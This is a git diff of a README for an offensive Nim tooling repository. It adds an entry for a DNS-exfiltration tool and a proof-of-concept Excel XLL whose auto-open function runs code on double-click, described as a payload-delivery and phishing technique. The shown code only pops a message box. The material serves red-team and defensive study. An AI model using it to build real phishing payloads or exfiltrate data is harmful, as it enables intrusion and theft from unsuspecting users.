@@ -87,6 +87,9 @@ My experiments in weaponizing [Nim](https://nim-lang.org/) for implant developme
 | [list_remote_shares.nim](../master/src/list_remote_shares.nim) | Use NetShareEnum to list the share accessible by the current user |
 | [chrome_dump_bin.nim](../master/src/chrome_dump_bin.nim) | Read and decrypt cookies from Chrome's sqlite database|
 | [suspended_thread_injection.nim](../master/src/suspended_thread_injection.nim) | Shellcode execution via suspended thread injection |
+| [dns_exfiltrate.nim](../master/src/dns_exfiltrate.nim) | Simple DNS exfiltration via TXT record queries |
+
+
 ## Examples that are a WIP
 
 | File | Description |
@@ -191,6 +194,31 @@ To compile:
 nim c -d=mingw --app=lib --nomain --cpu=amd64 mynim.dll
 ```
 
+### Creating XLLs
+You can make an XLL (an Excel DLL, imagine that) with an auto open function that can be used for payload delivery. The following code creates a simple for an XLL that has an auto open function and all other boilerplate code needed to compile as a link library. The POC compiles as a DLL, you can then change the extension to .xll and it will open in Excel and run the payload when double clicked:
+
+```
+#[
+    Compile:
+        nim c -d=mingw --app=lib --nomain --cpu=amd64 nim_xll.nim
+        
+    Will compile as a DLL, you can then just change the extension to .xll
+]#
+
+import winim/lean
+
+proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
+    MessageBox(0, "Hello, world !", "Nim is Powerful", 0)
+
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+
+  return true
+```
+
+There are many other sneaky things that can be done with XLLs. See [more examples of XLL tradecraft here](https://github.com/Octoberfest7/XLL_Phishing).
 
 ## Optimizing executables for size
 
@@ -335,3 +363,4 @@ var buf: array[5, byte] = [byte 0xfc,0x48,0x81,0xe4,0xf0,0xff]
 - [@frknayar](https://twitter.com/frknayar)
 - [@OffenseTeacher](https://twitter.com/OffenseTeacher)
 - [@fkadibs](https://twitter.com/fkadibs)
+- [@HuskyHacksMK](https://twitter.com/HuskyHacksMK)
